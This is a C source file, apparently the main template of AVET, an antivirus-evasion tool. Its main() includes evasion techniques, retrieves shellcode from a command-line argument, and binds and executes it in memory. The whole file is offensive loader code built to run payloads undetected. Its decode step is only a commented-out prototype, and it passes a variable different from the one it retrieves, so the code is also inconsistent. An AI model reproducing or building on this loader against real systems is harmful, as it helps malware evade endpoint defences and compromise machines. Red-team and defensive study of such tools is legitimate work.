/*
Author: Daniel Sauder
License: https://www.gnu.org/licenses/gpl.txt or LICENSE file
Web: https://github.com/govolution/avet
*/

//     "         .==,_                                          \n"
//     "        .===,_`\\                                        \n"
//     "      .====,_ ` \\      .====,__                         \n"
//     "---     .==-,`~. \\           `:`.__,                    \n"
//     " ---      `~~=-.  \\           /^^^     MEEP MEEP        \n"
//     "   ---       `~~=. \\         /                          \n"
//     "                `~. \\       /                           \n"
//     "                  ~. \\____./                            \n"
//     "                    `.=====)                            \n"
//     "                 ___.--~~~--.__                         \n"
//     "       ___\\.--~~~              ~~~---.._|/              \n"
//     "       ~~~\\\"                             /              \n"

//     " ________  ___      ___ _______  _________  \n" 
//     "|\\   __  \\|\\  \\    /  /|\\  ___ \\|\\___   ___\\ \n"
//     "\\ \\  \\|\\  \\ \\  \\  /  / | \\   __/\\|___ \\  \\_| \n"
//     " \\ \\   __  \\ \\  \\/  / / \\ \\  \\_|/__  \\ \\  \\  \n"
//     "  \\ \\  \\ \\  \\ \\    / /   \\ \\  \\_|\\ \\  \\ \\  \\ \n"
//     "   \\ \\__\\ \\__\\ \\__/ /     \\ \\_______\\  \\ \\__\\\n"
//     "    \\|__|\\|__|\\|__|/       \\|_______|   \\|__|\n"
//         "\n\nAnti Virus Evasion Tool by Daniel Sauder\n"


#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <tchar.h>


// Include shellcode decoding method to be used here
#include "encoding.h"

// Include shellcode binding technique to be used here
#include "shellcode_binding.h"

// Include shellcode retrieval method to be used here
#include "get_shellcode.h"


int main (int argc, char **argv)
{		
	// Include evasion techniques to be used here
	#include "techniques.h"	
	
	// Retrieve shellcode	
	unsigned char *encoded_shellcode = get_shellcode(argv[1]);	
	
	// Decode shellcode
	//void decode_shellcode(const unsigned char *ciphertext, unsigned char *plaintext, const int ciphetext_length, const unsigned char key)
	
	
	// Bind and execute shellcode here
	// buf is defined in defs.h by make_avet and contains the shellcode	
	bind_shellcode(shellcode);
	
	return 0;
}